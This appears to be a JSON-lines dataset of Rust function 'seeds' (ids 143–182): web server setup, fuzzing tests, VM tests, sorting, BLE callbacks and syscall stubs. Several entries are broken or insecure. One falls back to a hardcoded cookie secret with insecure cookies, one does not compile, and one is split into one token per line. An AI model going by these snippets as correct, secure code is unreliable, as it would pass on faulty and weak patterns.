{"seed":"fn read_num(cursor: &mut Cursor<Vec<u8>>) -> Result<u32, Box<std::error::Error>> {\n    let mut v: Vec<u8> = vec![];\n    let mut c: [u8; 1] = [0];\n\n    \/\/ consume whitespace\n    loop {\n        cursor.read(&mut c)?;\n        match &c {\n            b\" \" | b\"\\t\" | b\"\\n\" => { },\n              _                  => { cursor.seek(std::io::SeekFrom::Current(-1)); break; }\n        }\n    }\n\n    \/\/ read number\n    loop {\n        cursor.read(&mut c)?;\n        match c[0] {\n            b'0' ... b'9'        => { v.push(c[0]); },\n            b' ' | b'\\t' | b'\\n' => { cursor.seek(std::io::SeekFrom::Current(-1)); break; },\n              _                  => { bail!(\"Parse error\") }\n        }\n    }\n\n    let num_str = std::str::from_utf8(&v)?;\n    let num     = num_str.parse::<u32>()?;\n    Ok(num)\n}","id":143}
{"seed":"async fn main() -> std::io::Result<()> {\n    dotenv().ok();\n    let app_data = AppData {\n        conn_pool: database::create_pool(),\n    };\n\n    let mut listenfd = ListenFd::from_env();\n    let mut server = HttpServer::new(move || {\n        App::new()\n            .data(app_data.clone())\n            .service(index)\n            .configure(routes::config)\n            .default_service(web::route().to(fallback_route))\n            .wrap(middlewares::auth_middleware::Logging)\n            .wrap(Cors::new().finish())\n            .wrap(IdentityService::new(\n                CookieIdentityPolicy::new(\n                    env::var(\"COOKIE_SECRET\")\n                        .unwrap_or(\"DEFAULT_SECRET\".to_string())\n                        .as_bytes(),\n                )\n                .name(\"auth\")\n                .path(\"\/\")\n                .domain(env::var(\"APP_DOMAIN\").unwrap_or(\"localhost\".to_string()))\n                .max_age(chrono::Duration::days(1).num_seconds())\n                .secure(false),\n            ))\n    });\n\n    server = if let Some(l) = listenfd.take_tcp_listener(0).unwrap() {\n        server.listen(l)?\n    } else {\n        server.bind(\"localhost:8000\")?\n    };\n\n    server.run().await\n}","id":144}
{"seed":"async fn run_watchexec(args: Args) -> Result<()> {\n\tinfo!(version=%env!(\"CARGO_PKG_VERSION\"), \"constructing Watchexec from CLI\");\n\n\tlet init = config::init(&args);\n\n\tlet state = state::State::new()?;\n\tlet mut runtime = config::runtime(&args, &state)?;\n\truntime.filterer(filterer::globset(&args).await?);\n\n\tinfo!(\"initialising Watchexec runtime\");\n\tlet wx = Watchexec::new(init, runtime)?;\n\n\tif !args.postpone {\n\t\tdebug!(\"kicking off with empty event\");\n\t\twx.send_event(Event::default(), Priority::Urgent).await?;\n\t}\n\n\tinfo!(\"running main loop\");\n\twx.main().await.into_diagnostic()??;\n\tinfo!(\"done with main loop\");\n\n\tOk(())\n}","id":145}
{"seed":"fn add_twice() {\n    let project = project(\"add\").with_fuzz().build();\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"new_fuzz_target\")\n        .assert()\n        .success();\n    assert!(project.fuzz_target_path(\"new_fuzz_target\").is_file());\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"new_fuzz_target\")\n        .assert()\n        .stderr(\n            predicate::str::contains(\"could not add target\")\n                .and(predicate::str::contains(\"File exists (os error 17)\")),\n        )\n        .failure();\n}","id":146}
{"seed":"pub fn task_set_cpool(target: CAddr, cpool: CAddr) {\n    system_call(SystemCall::TaskSetCPool {\n        request: (target, cpool),\n    });\n}","id":147}
{"seed":"fn main() {\n    \/\/ let name = String::from(\"rust\");\n    let mut client = Client::new();\n\n    \/\/ now loop forever getting tasks every now and then\n    let duration = (&client.interval * 1000.0) as u64;\n\n    let sleep_duration = time::Duration::from_millis(duration);\n\n    let (channel_out, channel_in) = unbounded();\n    \/\/ sleep for duration given by server, every interval wake up and ask for new tasks\n    loop {\n        thread::sleep(sleep_duration);\n\n        \/\/ get new tasks from the server\n        \/\/ need to return success\/failure so we know if we should send something into the thread or not\n        client.get_task();\n        \/\/ fuck me\n        let mut c = client.clone();\n        let out_c = channel_out.clone();\n        \/\/ spawn a thread to deal with the new tasks\n        let thread_hndl = thread::spawn(move || {\n            handle_task(&mut c, out_c);\n        });\n        if let Ok(resp_from_thread) = channel_in.try_recv() {\n            println!(\"yayyy from main {}\", &resp_from_thread);\n            \/\/ need to send resp to server, and remvoe task from the queue\n            let resp_task_id = resp_from_thread.parse::<i32>().unwrap();\n            client.task_queue.retain(|x| x.task_id != resp_task_id);\n        }\n    }\n}","id":148}
{"seed":"fn main() {\r\n    let num = input(\"Ingrese un n\u00famero: \")\r\n        .unwrap()\r\n        .parse::<i32>()\r\n        .expect(\"Expected a number\");\r\n\r\n    if num % 2 == 0 {\r\n        println!(\"`{}` es un n\u00famero par.\", num);\r\n    } else {\r\n        println!(\"`{}` es un n\u00famero impar\", num);\r\n    }\r\n}","id":149}
{"seed":"fn run_alt_corpus() {\n    let corpus = Path::new(\"fuzz\").join(\"corpus\").join(\"run_alt\");\n    let alt_corpus = Path::new(\"fuzz\").join(\"alt-corpus\").join(\"run_alt\");\n\n    let project = project(\"run_alt_corpus\")\n        .with_fuzz()\n        .fuzz_target(\n            \"run_alt\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    assert!(data.len() <= 1);\n                });\n            \"#,\n        )\n        .file(corpus.join(\"fail\"), \"fail\")\n        .file(alt_corpus.join(\"pass-0\"), \"0\")\n        .file(alt_corpus.join(\"pass-1\"), \"1\")\n        .file(alt_corpus.join(\"pass-2\"), \"2\")\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"run_alt\")\n        .arg(&alt_corpus)\n        .arg(\"--\")\n        .arg(\"-runs=0\")\n        .assert()\n        .stderr(\n            predicate::str::contains(\"3 files found in fuzz\/alt-corpus\/run_alt\")\n                .and(predicate::str::contains(\"fuzz\/corpus\/run_alt\").not())\n                \/\/ libFuzzer will always test the empty input, so the number of\n                \/\/ runs performed is always one more than the number of files in\n                \/\/ the corpus.\n                .and(predicate::str::contains(\"Done 4 runs in\")),\n        )\n        .success();\n}","id":150}
{"seed":"async fn run_manpage(_args: Args) -> Result<()> {\n\tinfo!(version=%env!(\"CARGO_PKG_VERSION\"), \"constructing manpage\");\n\n\tlet man = Man::new(Args::command().long_version(None));\n\tlet mut buffer: Vec<u8> = Default::default();\n\tman.render(&mut buffer).into_diagnostic()?;\n\n\tif std::io::stdout().is_terminal() && which::which(\"man\").is_ok() {\n\t\tlet mut child = Command::new(\"man\")\n\t\t\t.arg(\"-l\")\n\t\t\t.arg(\"-\")\n\t\t\t.stdin(Stdio::piped())\n\t\t\t.stdout(Stdio::inherit())\n\t\t\t.stderr(Stdio::inherit())\n\t\t\t.group()\n\t\t\t.kill_on_drop(true)\n\t\t\t.spawn()\n\t\t\t.into_diagnostic()?;\n\t\tchild\n\t\t\t.inner()\n\t\t\t.stdin\n\t\t\t.as_mut()\n\t\t\t.unwrap()\n\t\t\t.write_all(&buffer)\n\t\t\t.await\n\t\t\t.into_diagnostic()?;\n\n\t\tif let Some(code) = child\n\t\t\t.wait()\n\t\t\t.await\n\t\t\t.into_diagnostic()?\n\t\t\t.code()\n\t\t\t.and_then(|code| if code == 0 { None } else { Some(code) })\n\t\t{\n\t\t\treturn Err(miette::miette!(\"Exited with status code {}\", code));\n\t\t}\n\t} else {\n\t\tstd::io::stdout()\n\t\t\t.lock()\n\t\t\t.write_all(&buffer)\n\t\t\t.into_diagnostic()?;\n\t}\n\n\tOk(())\n}","id":151}
{"seed":"fn map_params(tok: IRCToken) -> Result<IRCToken, ~str> {\n    \/\/ Sequence(~[Sequence(~[Sequence(~[Ignored, Unparsed(~\"##codelab\")])]), Sequence(~[Sequence(~[Ignored, Unparsed(~\":\"), Unparsed(~\"hi\")])])])\n    match tok {\n        Sequence(args) => Ok(Params(args.map(|arg| {\n            match arg.clone() {\n                Sequence([Sequence([Ignored, Unparsed(param)])]) => param,\n                Sequence([Sequence([Ignored, Unparsed(~\":\"), Unparsed(param)])]) => param,\n                _ => ~\"\"\n            }\n        }))),\n        _ => Err(~\"Malformed parameters\")\n    }\n}","id":152}
{"seed":"fn santa(instruction: &String) -> i32 {\n    \/\/ if '(' up else if ')' down\n    let mut floor: i32 = 0;\n    for paren in instruction.chars() {\n        println!(\"{}\", paren);\n        match paren {\n            '(' => floor += 1,\n            ')' => floor -= 1,\n            _ => panic!(),\n        }\n    }\n    floor\n}","id":153}
{"seed":"pub fn test_invalid_file_offset64() {\n    let buffer = fs::read(\"tests\/programs\/invalid_file_offset64\")\n        .unwrap()\n        .into();\n    let result = run::<u64, SparseMemory<u64>>(&buffer, &vec![\"invalid_file_offset64\".into()]);\n    assert_eq!(result.err(), Some(Error::ElfSegmentAddrOrSizeError));\n}","id":154}
{"seed":"pub fn add_history(history_type: HistoryType, history_path: String) -> Result<(), &'static str> {\n    let path_buf = Path::new(&history_path);\n    if !(path_buf.is_dir() || path_buf.is_file()) {\n        return Err(\"Not a validate dir or file path.\");\n    }\n    let mut configurator = Configurator::new();\n    configurator.add_history(history_type, path_buf);\n    configurator.save_config();\n    Ok(())\n}","id":155}
{"seed":"async fn save_metric_entry(mut database: &Database, hostname: &str, timestamp: &DateTime<Utc>, entry: DockerContainerMetricEntry) -> Result<(), MetricSaveError> {\n    sqlx::query!(\n        \"insert into metric_docker_containers (hostname, timestamp, name, state, cpu_usage, memory_usage, memory_cache, network_tx, network_rx) values ($1, $2, $3, $4, $5, $6, $7, $8, $9) returning name\",\n        hostname.to_string(), *timestamp, entry.name, entry.state, entry.cpu_usage, entry.memory_usage as i64, entry.memory_cache as i64, entry.network_tx, entry.network_rx\n    ).fetch_one(&mut database).await?;\n\n    Ok(())\n}","id":156}
{"seed":"fn build_dev() {\n    let project = project(\"build_dev\").with_fuzz().build();\n\n    \/\/ Create some targets.\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"build_dev_a\")\n        .assert()\n        .success();\n    project\n        .cargo_fuzz()\n        .arg(\"add\")\n        .arg(\"build_dev_b\")\n        .assert()\n        .success();\n\n    \/\/ Build to ensure that the build directory is created and\n    \/\/ `fuzz_build_dir()` won't panic.\n    project\n        .cargo_fuzz()\n        .arg(\"build\")\n        .arg(\"--dev\")\n        .assert()\n        .success();\n\n    let build_dir = project.fuzz_build_dir().join(\"debug\");\n\n    let a_bin = build_dir.join(\"build_dev_a\");\n    let b_bin = build_dir.join(\"build_dev_b\");\n\n    \/\/ Remove the files we just built.\n    fs::remove_file(&a_bin).unwrap();\n    fs::remove_file(&b_bin).unwrap();\n\n    assert!(!a_bin.is_file());\n    assert!(!b_bin.is_file());\n\n    \/\/ Test that building all fuzz targets does in fact recreate the files.\n    project\n        .cargo_fuzz()\n        .arg(\"build\")\n        .arg(\"--dev\")\n        .assert()\n        .success();\n\n    assert!(a_bin.is_file());\n    assert!(b_bin.is_file());\n}","id":157}
{"seed":"fn parseModelInfo(reader: &mut BufReader<&File>, buf: &mut String, models: &mut Vec<Model>, basePath: &str) -> Model {\r\n    \/\/Firstly, read the meshId and materialId;\r\n    reader.read_line(buf);\r\n    let mut split_info = buf.split(\" \");\r\n    if len(split_info) != 2 {}\r\n    let meshId: i32 = split_info.next().unwrap().parse().unwrap();\r\n    let materidId = split_info.next().unwrap().parse().unwrap();\r\n    let meshFilePath = basePath + \"\/meshes\/\" + meshId + \"_mesh.obj\";\r\n    let materialPath = basePath + \"\/materials\/\" + materidId + \"\/\" + materidId;\r\n    \/\/Then, read the position info;\r\n    split_info = buf.split(\" \");\r\n    let mut modelInfo: Vec<Vec3f> = Vec::new();\r\n    let mut infoIndex = 0;\r\n    while infoIndex < 3 {\r\n        reader.read_line(buf);\r\n        let mut split_info = buf.split(\" \");\r\n        modelInfo.push(Vec3f {\r\n            x: split_info.next().unwrap().parse().unwrap(),\r\n            y: split_info.next().unwrap().parse().unwrap(),\r\n            z: split_info.next().unwrap().parse().unwrap(),\r\n        });\r\n        infoIndex += 1;\r\n    }\r\n    loadImageFromMaterial(model, materidId);\r\n\r\n    models.push(Model {\r\n        meshId,\r\n        materidId: 0,\r\n        position: Vec3f {\r\n            x: modelInfo.get(0).unwrap().x,\r\n            y: modelInfo.get(0).unwrap().y,\r\n            z: modelInfo.get(0).unwrap().z,\r\n        },\r\n        rotation: Vec3f {\r\n            x: modelInfo.get(1).unwrap().x,\r\n            y: modelInfo.get(1).unwrap().y,\r\n            z: modelInfo.get(1).unwrap().z,\r\n        },\r\n        scaling: Vec3f {\r\n            x: modelInfo.get(2).unwrap().x,\r\n            y: modelInfo.get(2).unwrap().y,\r\n            z: modelInfo.get(2).unwrap().z,\r\n        },\r\n    }\r\n    );\r\n\r\n    \/\/Finally, we only need to read an empty line to finish the model parsing process\r\n    reader.read_line(buf);\r\n}","id":158}
{"seed":"pub fn merge_sort<T: PartialOrd + Debug>(mut v: Vec<T>) -> Vec<T> {\n    \/\/ sort the left half\n    \/\/ sort the right half O(n*ln(n))\n    \/\/ bring the sorted half together O(n)\n    if v.len() <= 1 {\n        return v;\n    }\n    let mut res = Vec::with_capacity(v.len());\n    let b = v.split_off(v.len()\/2);\n    let a = merge_sort(v);\n    let b = merge_sort(b);\n    \/\/ bring them together again add whichever is lowest the front of a or the front of b\n    let mut a_it = a.into_iter();\n    let mut b_it = b.into_iter();\n    let mut a_peek = a_it.next();\n    let mut b_peek = b_it.next();\n    loop {\n        match a_peek {\n            Some(ref a_val) => match b_peek{\n                Some(ref b_val) =>{\n                    if b_val < a_val {\n                        res.push(b_peek.take().unwrap());\n                        b_peek = b_it.next();\n                    } else {\n                        res.push(a_peek.take().unwrap());\n                        a_peek = a_it.next();\n                    }\n                }\n                None => {\n                    res.push(a_peek.take().unwrap());\n                    res.extend(a_it);\n                    return res;\n                }\n            }\n            None => {\n                if let Some(b_val) = b_peek {\n                    res.push(b_val);\n                }\n                res.extend(b_it);\n                return res;\n            }\n        }\n    }\n}","id":159}
{"seed":"fn run_with_crash() {\n    let project = project(\"run_with_crash\")\n        .with_fuzz()\n        .fuzz_target(\n            \"yes_crash\",\n            r#\"\n                #![no_main]\n                use libfuzzer_sys::fuzz_target;\n\n                fuzz_target!(|data: &[u8]| {\n                    run_with_crash::fail_fuzzing(data);\n                });\n            \"#,\n        )\n        .build();\n\n    project\n        .cargo_fuzz()\n        .arg(\"run\")\n        .arg(\"yes_crash\")\n        .arg(\"--\")\n        .arg(\"-runs=1000\")\n        .env(\"RUST_BACKTRACE\", \"1\")\n        .assert()\n        .stderr(\n            predicate::str::contains(\"panicked at 'I'm afraid of number 7'\")\n                .and(predicate::str::contains(\"ERROR: libFuzzer: deadly signal\"))\n                .and(predicate::str::contains(\"run_with_crash::fail_fuzzing\"))\n                .and(predicate::str::contains(\n                    \"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\\n\\\n                     \\n\\\n                     Failing input:\\n\\\n                     \\n\\\n                     \\tfuzz\/artifacts\/yes_crash\/crash-\"\n                ))\n                .and(predicate::str::contains(\"Output of `std::fmt::Debug`:\"))\n                .and(predicate::str::contains(\n                    \"Reproduce with:\\n\\\n                     \\n\\\n                     \\tcargo fuzz run yes_crash fuzz\/artifacts\/yes_crash\/crash-\"\n                ))\n                .and(predicate::str::contains(\n                    \"Minimize test case with:\\n\\\n                     \\n\\\n                     \\tcargo fuzz tmin yes_crash fuzz\/artifacts\/yes_crash\/crash-\"\n                )),\n        )\n        .failure();\n}","id":160}
{"seed":"fn get_submodules(\n    repo: &Repository,\n    at: &Commit,\n) -> Result<Vec<Submodule>, Box<dyn std::error::Error>> {\n    let submodule_cfg = modules_file(&repo, &at)?;\n    let submodule_cfg = Config::parse(&submodule_cfg)?;\n    let mut path_to_url = HashMap::new();\n    let entries = submodule_cfg.entries(None)?;\n    for entry in &entries {\n        let entry = entry?;\n        let name = entry.name().unwrap();\n        if name.ends_with(\".path\") {\n            let url = name.replace(\".path\", \".url\");\n            let url = submodule_cfg.get_string(&url).unwrap();\n            path_to_url.insert(entry.value().unwrap().to_owned(), url);\n        }\n    }\n    let mut submodules = Vec::new();\n    let tree = at.tree()?;\n    for (path, url) in &path_to_url {\n        let path = Path::new(&path);\n        let entry = tree.get_path(&path);\n        \/\/ the submodule may not actually exist\n        let entry = match entry {\n            Ok(e) => e,\n            Err(_) => continue,\n        };\n        assert_eq!(entry.kind().unwrap(), git2::ObjectType::Commit);\n        submodules.push(Submodule {\n            path: path.to_owned(),\n            commit: entry.id(),\n            repository: url.to_owned(),\n        });\n    }\n    submodules.retain(|s| {\n        let is_rust =\n            s.repository.contains(\"rust-lang\") || s.repository.contains(\"rust-lang-nursery\");\n        let exclude = vec![\n            \"https:\/\/github.com\/rust-lang\/llvm.git\",\n            \"https:\/\/github.com\/rust-lang\/llvm-project.git\",\n            \"https:\/\/github.com\/rust-lang\/lld.git\",\n            \"https:\/\/github.com\/rust-lang-nursery\/clang.git\",\n            \"https:\/\/github.com\/rust-lang-nursery\/lldb.git\",\n            \"https:\/\/github.com\/rust-lang\/libuv.git\",\n            \"https:\/\/github.com\/rust-lang\/gyp.git\",\n            \"https:\/\/github.com\/rust-lang\/jemalloc.git\",\n            \"https:\/\/github.com\/rust-lang\/compiler-rt.git\",\n            \"https:\/\/github.com\/rust-lang\/hoedown.git\",\n        ];\n        is_rust\n            && !exclude.contains(&s.repository.as_str())\n            && !exclude.contains(&&*format!(\"{}.git\", s.repository))\n    });\n    Ok(submodules)\n}","id":161}
{"seed":"fn a_table_should_preserve_the_money_supply() {\n  let mut table = HashMapOfTreeMap::new();\n  broker(&mut table, 1000);\n  expect_money_conserved(&table);\n}","id":162}
{"seed":"fn main() -> Result<()> {\n    let args = Args::parse();\n    let Args {\n        aspect_ratio,\n        image_width,\n        image_height,\n        samples_per_pixel,\n        outfile,\n        max_depth,\n    } = args;\n\n    let (stats_tx, stats_rx) = unbounded();\n    let (render_tx, render_rx) = bounded(1024);\n\n    let look_from = Point3::new(13.0, 2.0, 3.0);\n    let look_at = Point3::new(0.0, 0.0, 0.0);\n\n    \/\/ Camera\n    let camera = Camera::new(\n        look_from,\n        look_at,\n        Vec3::new(0.0, 1.0, 0.0),\n        20.0,\n        aspect_ratio,\n        0.1,\n        10.0,\n    );\n\n    \/\/ World\n    let world = World::get_world(true);\n\n    let color_handle = thread::spawn(move || {\n        pixels::pixel_loop(\n            &camera,\n            &world,\n            image_width,\n            image_height,\n            samples_per_pixel,\n            max_depth,\n            stats_tx,\n            render_tx,\n        )\n    });\n\n    let stats_handle = thread::spawn(move || {\n        stats::stats_loop(\n            stats_rx,\n            ((image_width as f32 * image_height as f32 * 11.3) as usize + 24) as usize,\n        )\n    });\n    let render_handle = thread::spawn(move || render::render_loop(&outfile, render_rx));\n\n    let color_io_result = color_handle.join().unwrap();\n    let stats_io_result = stats_handle.join().unwrap();\n    let render_io_result = render_handle.join().unwrap();\n\n    color_io_result?;\n    stats_io_result?;\n    render_io_result?;\n\n    Ok(())\n}","id":163}
{"seed":"pub fn quick_sort_rayon<T: Send + PartialOrd + Debug>(v: &mut[T]) {\n    if v.len() <= 1 {\n        return;\n    }\n    let p = pivot(v);\n    println!(\"{:?}\", v);\n    let (a, b) = v.split_at_mut(p);\n    \/\/ put f2 on queue then start f1;\n    \/\/ if another thread is ready it will steal f2\n    \/\/ this works recursively recursively down the stack\n    rayon::join(||quick_sort_rayon(a), || quick_sort_rayon(&mut b[1..]));\n}","id":164}
{"seed":"pub fn test_ebreak() {\n    let buffer = fs::read(\"tests\/programs\/ebreak64\").unwrap().into();\n    let value = Arc::new(AtomicU8::new(0));\n    let core_machine =\n        DefaultCoreMachine::<u64, SparseMemory<u64>>::new(ISA_IMC, VERSION0, u64::max_value());\n    let mut machine = DefaultMachineBuilder::new(core_machine)\n        .debugger(Box::new(CustomDebugger {\n            value: Arc::clone(&value),\n        }))\n        .build();\n    machine\n        .load_program(&buffer, &vec![\"ebreak\".into()])\n        .unwrap();\n    assert_eq!(value.load(Ordering::Relaxed), 1);\n    let result = machine.run();\n    assert!(result.is_ok());\n    assert_eq!(value.load(Ordering::Relaxed), 2);\n}","id":165}
{"seed":"fn\ntest_str\n(\n)\n-\n>\nResult\n<\n(\n)\n>\n{\nlet\ndb\n=\nchecked_memory_handle\n(\n)\n?\n;\nlet\ns\n=\n\"\nhello\nworld\n!\n\"\n;\ndb\n.\nexecute\n(\n\"\nINSERT\nINTO\nfoo\n(\nt\n)\nVALUES\n(\n?\n1\n)\n\"\n[\n&\ns\n]\n)\n?\n;\nlet\nfrom\n:\nString\n=\ndb\n.\none_column\n(\n\"\nSELECT\nt\nFROM\nfoo\n\"\n)\n?\n;\nassert_eq\n!\n(\nfrom\ns\n)\n;\nOk\n(\n(\n)\n)\n}","id":166}
{"seed":"fn list_migration_directories_with_an_empty_migrations_folder_works(api: TestApi) {\n    let migrations_directory = api.create_migrations_directory();\n\n    api.list_migration_directories(&migrations_directory)\n        .send()\n        .assert_listed_directories(&[]);\n}","id":167}
{"seed":"fn string_test() {\n    \/\/ literal\n    let speech = \"\\\"Ouch!\\\" said the well.\\n\";\n    println!(\"{}\", speech);\n    println!(\n        \"In the room the women come and go,\n         Singing of Mount Abora\"\n    );\n    println!(\n        \"It was a bright, cold day in Aplil, and \\\n         there were four of us \\\n         more or less.\"\n    );\n\n    let default_win_install_path = r\"C:\\Program Files\\Gorillas\";\n    println!(\"{}\", default_win_install_path);\n    \/\/ let pattern = Regex::new(r\"\\d(\\.\\d+)*\");\n\n    println!(\n        r###\"\n        This raw string started with 'r###\"'.\n        Therefore it does not end until we reach a quote mark ('\"')\n        followed immediately by three pound signs ('###'):\n    \"###\n    );\n\n    \/\/ byte strings\n    let method = b\"GET\";\n    assert_eq!(method, &[b'G', b'E', b'T']);\n\n    let noodles = \"noodles\".to_string();\n    let oodles = &noodles[1..];\n    let poodles = \"\\u{CA0}_\\u{CA0}\";\n\n    assert_eq!(oodles.len(), 6);\n    assert_eq!(poodles.len(), 7);\n    assert_eq!(poodles.chars().count(), 3);\n\n    \/\/ let mut s = \"hello\";\n    \/\/ s[0] = 'c'; error: tye thpe 'str' cannot be mutably indexed\n    \/\/ s.push('\\n'); error: no method named `push` found for type `&str`\n\n    assert_eq!(\n        format!(\"{}\u00b0 {:02}\u2019 {:02}\u201d N\", 24, 5, 23),\n        \"24\u00b0 05\u2019 23\u201d N\".to_string()\n    );\n    let bits = vec![\"veni\", \"vidi\", \"vici\"];\n    assert_eq!(bits.concat(), \"venividivici\");\n    assert_eq!(bits.join(\",\"), \"veni,vidi,vici\");\n\n    assert!(\"ONE\".to_lowercase() == \"one\");\n\n    assert!(\"peanut\".contains(\"nut\"));\n    assert_eq!(\"\\u{CA0}_\\u{CA0}\".replace(\"\\u{CA0}\", \"\u25a0\"), \"\u25a0_\u25a0\");\n    assert_eq!(\"     clean\\n\".trim(), \"clean\");\n\n    for word in \"veni, vidi, vici\".split(\", \") {\n        assert!(word.starts_with(\"v\"));\n    }\n}","id":168}
{"seed":"fn tuple_test() {\n    let text = \"I see the eigenvalue in thine eye\";\n    let (head, tail) = text.split_at(21);\n    assert_eq!(head, \"I see the eigenvalue \");\n    assert_eq!(tail, \"in thine eye\");\n}","id":169}
{"seed":"unsafe fn system_call_raw() {\n    asm!(\"int 80h\"\n         ::\n         : \"rax\", \"rbx\", \"rcx\", \"rdx\",\n         \"r8\", \"r9\", \"r10\", \"r11\", \"r12\", \"r13\", \"r14\", \"r15\"\n         : \"volatile\", \"intel\");\n}","id":170}
{"seed":"fn channel_take_nonpayload(target: CAddr) -> ChannelMessage {\n    let result = system_call(SystemCall::ChannelTake {\n        request: target,\n        response: None\n    });\n    match result {\n        SystemCall::ChannelTake {\n            response, ..\n        } => {\n            return response.unwrap()\n        },\n        _ => panic!(),\n    };\n}","id":171}
{"seed":"fn align_to(size: uint, align: uint) -> uint {\n\t    assert!(align != 0);\n\t\t    (size + align - 1) & !(align - 1)\n}","id":172}
{"seed":"pub fn test_nop() {\n    let buffer = fs::read(\"tests\/programs\/nop\").unwrap().into();\n    let result = run::<u32, SparseMemory<u32>>(&buffer, &vec![\"nop\".into()]);\n    assert!(result.is_ok());\n    assert_eq!(result.unwrap(), 0);\n}","id":173}
{"seed":"fn desearlizer_client(req: &mut reqwest::Response) -> Result<Client, Error> {\n    let mut buffer = String::new();\n    match req.read_to_string(&mut buffer) {\n        Ok(_) => (),\n        Err(e) => println!(\"error : {}\", e.to_string())\n    };\n    println!(\"buffer before serializaztion: {}\", buffer);\n\n    let v = match serde_json::from_str::<Client>(&buffer){\n        Ok(v) => v,\n        Err(e) => return Err(e)\n    };\n    Ok(v)\n}","id":174}
{"seed":"fn show_image(image: &Image)\n{\n    let sdl             = sdl2::init().unwrap();\n    let video_subsystem = sdl.video().unwrap();\n    let display_mode    = video_subsystem.current_display_mode(0).unwrap();\n\n    let w = match display_mode.w as u32 > image.width {\n        true  => image.width,\n        false => display_mode.w as u32\n    };\n    let h = match display_mode.h as u32 > image.height {\n        true  => image.height,\n        false => display_mode.h as u32\n    };\n    \n    let window = video_subsystem\n        .window(\"Image\", w, h)\n        .build()\n        .unwrap();\n    let mut canvas = window\n        .into_canvas()\n        .present_vsync()\n        .build()\n        .unwrap();\n    let black = sdl2::pixels::Color::RGB(0, 0, 0);\n\n    let mut event_pump = sdl.event_pump().unwrap();\n    \/\/ render image\n        canvas.set_draw_color(black);\n        canvas.clear();\n\n        for r in 0..image.height {\n            for c in 0..image.width {\n                let pixel = &image.pixels[image.height as usize - r as usize - 1][c as usize];\n                canvas.set_draw_color(Color::RGB(pixel.R as u8, pixel.G as u8, pixel.B as u8));\n                canvas.fill_rect(Rect::new(c as i32, r as i32, 1, 1)).unwrap();\n            }\n        }\n        \n        canvas.present();\n\n    'main: loop \n    {        \n        for event in event_pump.poll_iter() {\n            match event {\n                sdl2::event::Event::Quit {..} => break 'main,\n                _ => {},\n            }\n        }\n\n        sleep(Duration::new(0, 250000000));\n    }\n    \n}","id":175}
{"seed":"pub unsafe extern \"C\" fn gatt_svr_register_cb(\n    ctxt: *mut ble_gatt_register_ctxt,\n    _arg: *mut ::core::ffi::c_void,\n) {\n    let mut buf_arr: [i8; BLE_UUID_STR_LEN as usize] = [0; BLE_UUID_STR_LEN as usize];\n    let buf = buf_arr.as_mut_ptr();\n\n    match (*ctxt).op as u32 {\n        BLE_GATT_REGISTER_OP_SVC => {\n            printf(\n                cstr!(\"registered service %s with handle=%d\\n\"),\n                ble_uuid_to_str((*(*ctxt).__bindgen_anon_1.svc.svc_def).uuid, buf),\n                (*ctxt).__bindgen_anon_1.svc.handle as i32,\n            );\n        }\n\n        BLE_GATT_REGISTER_OP_CHR => {\n            printf(\n                cstr!(\"registering characteristic %s with def_handle=%d val_handle=%d\\n\"),\n                ble_uuid_to_str((*(*ctxt).__bindgen_anon_1.chr.chr_def).uuid, buf),\n                (*ctxt).__bindgen_anon_1.chr.def_handle as i32,\n                (*ctxt).__bindgen_anon_1.chr.val_handle as i32,\n            );\n        }\n\n        BLE_GATT_REGISTER_OP_DSC => {\n            printf(\n                cstr!(\"registering descriptor %s with handle=%d\\n\"),\n                ble_uuid_to_str((*(*ctxt).__bindgen_anon_1.dsc.dsc_def).uuid, buf),\n                (*ctxt).__bindgen_anon_1.dsc.handle as i32,\n            );\n        }\n        _ => {\n            printf(cstr!(\"unknown operation: %d\\n\"), (*ctxt).op as u32);\n        }\n    }\n}","id":176}
{"seed":"fn de_board(raw: Vec<usize>, t: isize, l: i32, width: u8, height: u8) -> game::Board {\n    let mut res = game::Board::new(t, l, width, height);\n    res.pieces = raw\n        .into_iter()\n        .map(|x| game::Piece::from(x))\n        .collect();\n    res\n}","id":177}
{"seed":"const fn null_ble_gatt_chr_def() -> ble_gatt_chr_def {\n    return ble_gatt_chr_def {\n        uuid: ptr::null(),\n        access_cb: None,\n        arg: (ptr::null_mut()),\n        descriptors: (ptr::null_mut()),\n        flags: 0,\n        min_key_size: 0,\n        val_handle: (ptr::null_mut()),\n    };\n}","id":178}
{"seed":"fn get_disjoint<T>(ts: &mut [T], a: usize, b: usize) -> (&mut T, &mut T) {\n    assert!(a != b, \"a ({}) and b ({}) must be disjoint\", a, b);\n    assert!(a < ts.len(), \"a ({}) is out of bounds\", a);\n    assert!(b < ts.len(), \"b ({}) is out of bounds\", b);\n    if a < b {\n        let (al, bl) = ts.split_at_mut(b);\n        (&mut al[a], &mut bl[0])\n    } else {\n        let (bl, al) = ts.split_at_mut(a);\n        (&mut al[0], &mut bl[b])\n    }\n}","id":179}
{"seed":"fn hard_fault(ef: &ExceptionFrame) -> ! {\n    panic!(\"Hardfault... : {:#?}\", ef);\n}","id":180}
{"seed":"pub fn debug_test_succeed() {\n    system_call(SystemCall::DebugTestSucceed);\n    loop {}\n}","id":181}
{"seed":"fn main() {\n    println!(\"Run via `cargo run-wasm --example visualiser_for_wasm`\");\n}","id":182}
